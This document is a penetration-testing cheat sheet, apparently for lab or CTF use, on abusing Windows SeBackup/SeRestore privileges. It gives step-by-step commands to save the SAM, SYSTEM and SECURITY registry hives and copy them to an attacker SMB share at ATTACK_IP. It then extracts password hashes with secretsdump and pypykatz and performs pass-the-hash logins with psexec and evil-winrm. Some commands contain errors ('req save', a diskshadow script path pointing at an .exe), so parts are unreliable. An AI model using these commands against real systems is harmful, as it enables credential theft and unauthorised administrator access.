# Dump SAM and SYSTEM hives

## Privileges: SeBackup/SeRestore

#### 1: Backup SAM and SYSTEM hashes

 - cd /

 - mkdir temp

 - cd temp

 - req save hklm\system c:\temp\system

 - req save hklm\sam c:\temp\sam

 - download sam

 - download system

#### 2: Create SMB Server on attacking machine

 - 1: mkdir share

 - 2: impacket-smbserver -smb2support -username USER -password PASSWORD public share

#### 3: Copy backups to share folder

- copy c:\users\user\sam.hive \\ATTACK_IP\public\

- copy c:\users\user\system.hive \\ATTACK_IP\public\

#### 4: Retrieve hashes

 - impacket-secretsdump -sam sam.hive -system system.hive LOCAL

## OR 

 - pypykatz registry --sam sam system

#### 5: Pass-The-Hash Attack (PtH)

- impacket-psexec -hashes HASH administrator@TARGET_IP

#### TIP: We can also use evil-winrm for PtH attacks.

- evil-winrm -i TARGET_IP -u administrator -H 'NTLM_HASH'

## Alternate Method to transfer the Hives: reg.py  remotely on Linux

 - python smbserver.py -smb2support share /tmp

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SAM' -o '\\attacker ip\share'

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SYSTEM' -o '\\attacker ip\share'

 - reg.py "domain"/"backup_operator_username":"password"@"dc ip" save -keyName 'HKLM\SECURITY' -o '\\attacker ip\share'

## Alternate Method: SeBackupPrivilegeUtils https://github.com/giuliano108/SeBackupPrivilege

### Usage:

 - Import-Module .\SeBackupPrivilegeUtils.dll

 - Import-Module .\SeBackupPrivilegeCmdLets.dll

 - Set-SeBackupPrivilege

 - Get-SeBackupPrivilege

## Alternate Method: Robocopy

 - robocopy C:\Users\Administrator\Desktop C:\Users\Public root.txt /B

 - type C:\Users\Public\root.txt

## Alternate Method: diskshadow.exe

### Create a script for diskshadow to execute

 - cd /

 - mkdir temp

 - cd temp

 - echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii

 - echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append

 - echo "create" | out-file ./diskshadow.txt -encoding ascii -append

 - echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

 - dir

 - diskshadow.exe /s c:\temp\diskshadow.exe

  ### Copy the SAM/SYSTEM/SECURITY hives to our temp folder

 - robocopy /b Z:\Windows\System32\Config C:\temp SAM

 - robocopy /b Z:\Windows\System32\Config C:\temp SYSTEM

 - robocopy /b Z:\Windows\System32\Config C:\temp SECURITY

### Then download all of them to our machine

## Dump hashes

### 1) Pypykatz

 - pypykatz registry --sam sam system

### 2) impacket-secretsdump

 - impacket-secretsdump -sam sam -system system LOCAL
